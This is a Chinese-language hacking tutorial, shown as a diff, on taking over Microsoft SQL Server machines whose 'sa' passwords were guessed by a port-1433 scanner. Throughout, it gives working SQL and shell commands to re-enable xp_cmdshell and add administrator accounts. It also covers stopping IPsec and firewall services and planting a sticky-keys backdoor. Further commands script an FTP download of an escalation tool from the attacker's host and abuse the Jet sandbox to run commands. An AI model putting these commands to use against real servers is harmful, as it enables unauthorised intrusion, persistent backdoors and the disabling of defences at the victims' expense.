@@ -1,0 +1,147 @@
+
+蛋疼写了个1433口令提权的详细过程
+
+前段时间我朋友给我一个sopo的软件，说是扫1433口令的，而且猜解速度很快，我就找个服务器试了试，
+
+确实不错能扫到一些比较强点的口令。所以这段时间就玩了一下1433错误的恢复和提权。
+
+sa的权限直接加用户到超管不就成了吗.其实在sa权限下还是有很多的问题的 大家可以捡有用的看 没用的就略过吧
+
+下面来说sa下执行命令错误的几种情况：
+
+1、无法装载DLL xpsql70.dll或该DLL所引用的某一DLL。原因126(找不到指定模块。)
+
+
+这种情况比较常见的，修复起来说简单也简单，但是有条件的。这种情况要是能列出目录（用sqltools v2.0就有列目录功能）恭喜你这个有80%的情况能修复了，如果能列目录，那么只要找到xplog70.dll的路径执行以下命令就可以了。
+第一步
+exec sp_dropextendedproc 'xp_cmdshell'  （这个命令就是删除原有的cmdshell，因为已经出错了）
+第二步
+dbcc addextendedproc ("xp_cmdshell","c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll")
+;EXEC sp_configure   'show advanced options', 0 –
+当然这是sql命令，用查询分析器执行。第二步里的c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll就是xplog70.dll的路径，这个路径是比较常见的，如果c盘没有可以找找其他盘符。
+
+
+2、无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+其实这个跟上面的126是一样的就是cmdshell出错了只要找到备份的xplog70.dll按照上面的方法就能修复了。
+
+
+3  未能找到存储过程'master..xpcmdshell'
+
+这种情况我看到网上的方法是：
+第一步先删除：
+drop procedure sp_addextendedproc 
+drop procedure sp_oacreate 
+exec sp_dropextendedproc 'xp_cmdshell' 
+
+第二步恢复：
+dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+其实这个跟上面的还是一样，其实如果细心的话，上面的126 127只执行第一步的时候就会出现未能找到存储过程'master..xpcmdshell' 因为第一步就是删除cmdshell的存储过程。所以这种情况下只执行上面的第二个步骤就可以了。
+
+
+
+4.Error Message:SQL Server 阻止了对组件 'xp_cmdshell' 的 过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
+
+这种情况是最简单的了，因为什么都不用考虑，直接执行以下命令就可以了
+
+;EXEC sp_configure 'show advanced options', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure 'xp_cmdshell', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure   'show advanced options', 0 –
+
+
+经过上面的修复能够执行cmd命令了，下面就要开始提权了。我一般都是ipconfig先查下ip看看是不是内网，然后REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber查看一下终端端口，再netstat –an看看终端是否打开 然后net user 用户 密码 /add 加个用户 再net localgroup administrators 用户 /add一切顺利的话，这就拿下一个服务器了。但是在这个过程中还会遇到很多问题。
+
+1、   net提权成功但是连接不上终端有下面几种情况
+（1）、服务器在内网。
+（2）、做了tcp/ip筛选。
+先执行下面cmd命令：
+cmd /c regedit -e c:\1.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip，导出注册表里关于TCP/IP筛选的第一处
+cmd /c regedit -e c:\2.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip，导出注册表里关于TCP/IP筛选的第二处
+cmd /c regedit -e c:\3.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip"，导出注册表里关于TCP/IP筛选的第三处
+然后回到c盘1.reg,2.reg,3.reg，把1.reg,2.reg,3.reg下载回来到自己的硬盘里面编辑一下，找到EnableSecurityFilters这个 字段看看dword后面的键值是否为00000000，如果为00000001就说明管理员做了tcp/ip筛选，我们只要把1改成0就行了，2.reg和3.reg进行一样的修改。
+（3）、做了ip安全策略。
+执行cmd命令： cmd /c net stop policyagent 将IPSEC Services服务停了它。再连终端。
+（4）、管理员设置的终端登陆权限只有指定的用户可以。
+（5）、防火墙。  执行cmd命令：  net stop alg /y                net stop sharedaccess
+
+
+2、net提权出现 拒绝访问 
+
+可以尝试一下net1 user 用户 密码 /add 如果net1也是拒绝访问可以copy一个shfit后门试试执行cmd命令：copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+如果提示 复制1文件 哪么证明成功了。连接终端然后按5下shift看看蹦出来了什么。玩咔咔 资源管理器，现在只要手工加个用户就好了。
+
+3、        net提权出现 拒绝访问错误5 （重点）
+
+这种情况就不用尝试net1了，可以试试copy shift后门，如果copy后提示复制0文件，证明没有成功。那么可以试试能不能上传，如果能上传直接传个前段时间出来的无net提权工具，然后加个用户就可以了。但是这种情况大部分都是不能上传的，那么就要考虑一下了。既然能执行cmd，那么就能通过cmd下ftp下载文件，可是ftp前提是要能写进文本或批处理。那么就可以通过sql语句写进一个文本或批处理啊。
+
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'C:\1.bat', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'open IP'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'ftp账号'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'ftp密码'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'get en.exe（无net提权脚本）c:\en.exe'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'bye'
+
+查询分析器执行成功后，不出意外，会在c盘出现一个1.bat（如果执行成功了，c盘却没有，可以换个文件夹写入，因为哪个服务器c盘根目录禁止写入）
+然后cmd执行ftp -s:c:\1.bat
+这个执行完了以后，就会在c盘ftp下载一个无net提权脚本 或者直接写个vbs提权脚本
+
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set  o=CreateObject( "Shell.Users" )'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set z=o.create("用户")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'z.changePassword "密码",""'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'z.setting("AccountType")=3'
+然后cmd执行cscript c:\1.vbs 就可以了
+
+4、        前面说的是修复成功能执行cmd命令的，但是有的修复后，又会出现新的问题
+
+（1）、Message:在执行 xp_cmdshell 的过程中出错。调用 'CreateProcess' 失败，错误代码: '5'。
+
+错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.
+SQL查看终端端口及开放情况：
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
+好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的。
+
+这条语句将explorer.exe复制为sethc.exe
+
+declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe','c:\windows\system32\sethc.exe';
+
+这条语句将sethc.exe复制到dllcache目录下
+
+declare @oo int exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe','c:\windows\system32\dllcache\sethc.exe';
+
+另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。
+
+（2）、xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行）
+
+这种情况就是比较棘手的了，网上说这种情况
+
+EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user 123 123 /add")');
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators 123 /add")');
+
+这样直接加用户就成了，我查了查这个事利用的沙盘提权，但是通过我的实践，这个成功率很低，因为大部分的服务器都把c:\windows\system32\ias\ias.mdb给删掉了。那么可以试试映像劫持sethc，当然映像劫持也是有条件的，1 要存在xp_regwrite这个存储过程 2 就是'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'这个键值没有被删
+
+可以先sql命令查询一下注册表粘滞键是否被劫持
+
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+
+如果提示没有找到问题，证明被删了，没有办法了，如果提示sethc.exe 执行sql命令
+
+EXEC master..xp_regwrite
+@rootkey='HKEY_LOCAL_MACHINE',
+@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
+@value_name='Debugger',
+@type='REG_SZ',
+@value='C:\WINDOWS\explorer.exe'
+
+连接终端5下shift后直接进入桌面了，然后手工添加。
+
+写的比较详细了，当然还有很多情况是提权不了的。希望有新方法的朋友可以加我Q：317318735  交流
+
